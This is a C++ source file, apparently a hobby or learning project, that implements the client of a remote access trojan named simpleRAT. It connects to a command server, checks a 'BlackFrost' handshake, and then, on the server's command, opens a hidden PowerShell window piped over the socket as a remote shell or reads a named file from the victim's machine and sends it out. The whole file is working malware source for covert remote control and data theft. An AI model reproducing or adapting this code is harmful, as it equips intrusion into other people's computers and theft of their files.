// simpleRAT.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "Header.h"

int keepRunning = 1;
HANDLE newStdIn, writeStdIn;
HANDLE newStdOut, readStdOut;
PROCESS_INFORMATION powershell;

bool initWSA()
{
    WSADATA wsaData;
    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }
    return 0;
}

bool performHandshake(SOCKET s)
{
    const char* handshake = "BlackFrost";
    char response[16];
    ZeroMemory(response, 16);
    send(s, handshake, strlen(handshake), 0);
    int byteRead = recv(s, response, 11, 0);
    if (byteRead == 0)
    {
        puts("Connection to server is closed");
        return false;
    }
    else if (byteRead > 0)
    {
        if (strncmp(response, handshake, 10) == 0) return true;
        else return false;
    }
    else
    {
        printf("recv failed: %d\n", WSAGetLastError());
        return false;
    }

}

bool spawnPowerShell(SOCKET s)
{
    SECURITY_ATTRIBUTES pipeAttr;
    pipeAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    pipeAttr.bInheritHandle = true;
    pipeAttr.lpSecurityDescriptor = NULL;

    CreatePipe(&newStdIn, &writeStdIn, &pipeAttr, 0);
    CreatePipe(&readStdOut, &newStdOut, &pipeAttr, 0);

    
    STARTUPINFOA startupInfo;

    ZeroMemory(&powershell, sizeof(powershell));
    ZeroMemory(&startupInfo, sizeof(startupInfo));

    //hook stdin, stdout and stderr of the powershell
    startupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startupInfo.hStdInput = newStdIn;
    startupInfo.hStdOutput = newStdOut;
    startupInfo.hStdError = newStdOut;
    startupInfo.wShowWindow = SW_HIDE;    //hide the windows

    bool processStatus = CreateProcessA(NULL, (LPSTR)"powershell.exe", 0, 0, true, 0, 0, 0, &startupInfo, &powershell);
    if (!processStatus)
    {
        puts("Can't start powershell");
        return 0;
    }
    char output[512];
    int byteRead;

    Sleep(2000);
    do
    {
        ZeroMemory(output, sizeof(output));
        //check if there is any byte to read (this function doesn't delete data from the pipe's buffer)
        PeekNamedPipe(readStdOut, output, 512, (LPDWORD)&byteRead, 0, 0);
        if (byteRead <= 0) break;

        //actually read the bytes and delete them from the pipe's buffer
        if (!ReadFile(readStdOut, output, byteRead, (LPDWORD)&byteRead, 0)) break;
        output[byteRead] = 0; //null-terminate, just to be sure

    } while (send(s, output, strlen(output), 0) > 0);

    return communicatePowerShell(s);

}

bool communicatePowerShell(SOCKET s)
{
    char command[512];
    int recvStat;
    while (true)
    {
        ZeroMemory(command, sizeof(command));
        recvStat = recv(s, command, sizeof(command), 0);
        if (recvStat < 0)
        {
            puts("Server turned off");
            return 0;
            break;
        }

        //quit if the command id is not correct
        if (*(int*)command != 2)
        {
            puts("Invalid ID");
            send(s, "Invalid ID", strlen("Invalid ID"), 0);
            continue;
        }
        int byteWritten;
        //command[4 + strlen(command + 4)] = '\n';
        if (WriteFile(writeStdIn, command + 4, strlen(command + 4), (LPDWORD)&byteWritten, 0) == 0)
        {
            send(s, "Failed to write to pipe", 26, 0);
            continue;
        }
        char test[256];
        Sleep(3000);
        int byteRead;
        char output[4096];
        do
        {
            ZeroMemory(output, sizeof(output));
            //check if there is any byte to read (this function doesn't delete data from the pipe's buffer)
            PeekNamedPipe(readStdOut, output, 512, (LPDWORD)&byteRead, 0, 0);
            if (byteRead <= 0) break;

            //actually read the bytes and delete them from the pipe's buffer
            if (!ReadFile(readStdOut, output, byteRead, (LPDWORD)&byteRead, 0)) break;

        } while (send(s, output, byteRead, 0) > 0);

        if (strcmp(command + 4, "exit\n") == 0)
        {
            cleanUp();
            break;
        }
    }
    return 1;
}

bool getFileContent(SOCKET s, char* filename)
{
    HANDLE fileHandle = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE)
    {
        puts("Can't open file");
        return 0;
    }

    HANDLE fileMap = CreateFileMappingA(fileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
    if (fileMap == NULL)
    {
        CloseHandle(fileHandle);
        puts("Can't create mapping");
        return 0;
    }

    BYTE* fileContent = (BYTE*)MapViewOfFile(fileMap, FILE_MAP_READ, 0, 0, 0);
    if (fileContent == NULL)
    {
        puts("Can't map view to address space");
        return 0;
    }

    LARGE_INTEGER fileSizeStruct;
    GetFileSizeEx(fileHandle, &fileSizeStruct);
    LONGLONG fileSize = fileSizeStruct.QuadPart;
    if (send(s, (const char*)fileContent, fileSize, 0) <= 0) return 0;

    UnmapViewOfFile(fileContent);
    CloseHandle(fileMap);
    CloseHandle(fileHandle);
    return 1;

}

void cleanUp()
{
    CloseHandle(newStdIn);
    CloseHandle(newStdOut);
    CloseHandle(readStdOut);
    CloseHandle(writeStdIn);
    CloseHandle(powershell.hProcess);
    CloseHandle(powershell.hThread);

    newStdIn = 0;
    newStdOut = 0;
    readStdOut = 0;
    writeStdIn = 0;
    ZeroMemory(&powershell, sizeof(powershell));
}


int main()
{ 
    initWSA();

    int iResult;
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    struct addrinfo* server = NULL;

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", "8888", NULL, &server);
    if (iResult != 0) 
    {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    if (connect(s, server->ai_addr, server->ai_addrlen) == SOCKET_ERROR)
    {
        printf("Connection error: %d", WSAGetLastError());
        exit(1);
    }

    if (!performHandshake(s))
    {
        printf("Handshake failed");
        exit(1);
    }

    while (keepRunning)
    {
        char command[256];
        ZeroMemory(command, 256);

        if (recv(s, command, 256, 0) <= 0) break;
        //printf("%d", *(int*)command);
        bool status = 1;
        switch (*(int*)command)
        {
        case 1:
            puts("Exit shell");
            keepRunning = 0;   
            break;
        case 2:
            puts("Open powershell");
            status = spawnPowerShell(s);
            break;

        case 3:
            puts("Upload file");
            status = getFileContent(s, command + 4);
            break;

        default:
            puts("Invalid command id");
            break;
        }
        if (!status) puts("Failed to execute command");
    }
    cleanUp();
    closesocket(s);
    WSACleanup();
    return 0;
}